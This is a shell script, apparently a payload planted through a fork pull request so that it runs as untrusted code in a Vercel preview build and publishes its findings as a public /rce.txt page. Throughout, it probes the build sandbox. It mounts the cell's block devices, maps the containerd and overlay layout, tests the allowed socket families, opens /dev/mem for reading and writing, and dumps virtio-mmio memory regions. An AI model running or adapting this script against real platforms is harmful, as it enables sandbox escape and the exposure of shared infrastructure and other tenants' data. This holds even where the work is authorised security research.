#!/bin/sh
# Payload introduced ONLY by the fork PR. Round 7: the cell has a second block
# device (/dev/vdb) and an XFS volume mounted at /vercel that also provides the
# apm/metrics sockets and the proxy CA. Is that volume per-cell or shared?
OUT=../../public
mkdir -p "$OUT"
echo '<h1>Vercel preview lab</h1><p><a href="/rce.txt">/rce.txt</a></p>' > "$OUT/index.html"
F="$OUT/rce.txt"
{
  echo "== partitions & mounts =="
  cat /proc/partitions 2>&1
  df -h 2>&1 | head -12
  grep -E 'vda|vdb|root|xfs|overlay' /proc/mounts 2>&1 | head -8
  echo "== what the platform puts inside the cell =="
  ls -la /vercel 2>&1 | head -20
  ls -la /var/lib 2>&1 | head -12
  echo "== per-cell or shared? containerd + cell-overlay layout =="
  ls -la /var/lib/cell-overlay-images 2>&1 | head -8
  ls -la /var/lib/cell-overlay-images/containers 2>&1 | head -12
  ls /var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots 2>&1 | head -5
  ls -la /var/lib/containerd 2>&1 | head -10
  echo "== filesystem identity =="
  stat -f / /vercel 2>&1 | head -12
  echo "== mount the second disk read-only and walk it =="
  mkdir -p /tmp/vdbm /tmp/vdam 2>&1
  mount -o ro /dev/vdb /tmp/vdbm 2>&1
  ls -la /tmp/vdbm 2>&1 | head -15
  find /tmp/vdbm -maxdepth 3 -type d 2>/dev/null | head -25
  umount /tmp/vdbm 2>&1
  mount -o ro /dev/vda /tmp/vdam 2>&1
  ls -la /tmp/vdam 2>&1 | head -12
  umount /tmp/vdam 2>&1
} > "$F" 2>&1
{
  echo "== socket families allowed to untrusted build code =="
  /uv/python/bin/python3 - <<'PYEOF' 2>&1
import socket
fams = {"AF_INET":2,"AF_INET6":10,"AF_UNIX":1,"AF_PACKET":17,"AF_NETLINK":16,
        "AF_VSOCK":40,"AF_CAN":29,"AF_BLUETOOTH":31,"AF_ICMP":2,"AF_XDP":43,
        "AF_KEY":39,"AF_SMC":45,"AF_IPX":6,"AF_DECnet":10}
for name,f in fams.items():
    try:
        s=socket.socket(f, socket.SOCK_STREAM); s.close()
        print("  %-12s OK" % name)
    except Exception as e:
        print("  %-12s %s" % (name, repr(e)[:60]))
try:
    import os
    fd=os.open("/dev/mem", os.O_RDONLY)
    print("  open /dev/mem: OK")
    os.close(fd)
    w=False
    try:
        fdw=os.open("/dev/mem", os.O_WRONLY); os.close(fdw); w=True
    except Exception as e:
        w=str(e)
    print("  write /dev/mem:", w)
except Exception as e:
    print("  /dev/mem:", repr(e)[:60])
PYEOF
} >> "$F" 2>&1
{
  echo "== MMIO regions (LNRO0005 = virtio-mmio) via /dev/mem =="
  node -e '
const fs=require("fs");
let mem=null;
try{mem=fs.openSync("/dev/mem","r");}catch(e){console.log("  /dev/mem: "+e.code);process.exit(0);}
const io=fs.readFileSync("/proc/iomem","utf8").split("\n").filter(l=>/LNRO|virtio|mmio/i.test(l)).slice(0,14);
for(const l of io){
  const m=l.match(/^\s*([0-9a-f]+)-([0-9a-f]+)\s*:\s*(.*)$/); if(!m)continue;
  const base=parseInt(m[1],16), sz=parseInt(m[2],16)-base+1;
  const buf=Buffer.alloc(Math.min(sz,128));
  try{const got=fs.readSync(mem,buf,0,buf.length,base);
    console.log("  "+m[1]+" ("+m[3].trim()+", "+sz+"b) read "+got+"b: "+buf.slice(0,got).toString("hex").replace(/(.{8})/g,"$1 ").trim().slice(0,220));
  }catch(e){console.log("  "+m[1]+" read failed "+e.code);}
}
' >> "$F" 2>&1
} >> "$F" 2>&1
sleep 2
cat "$F"
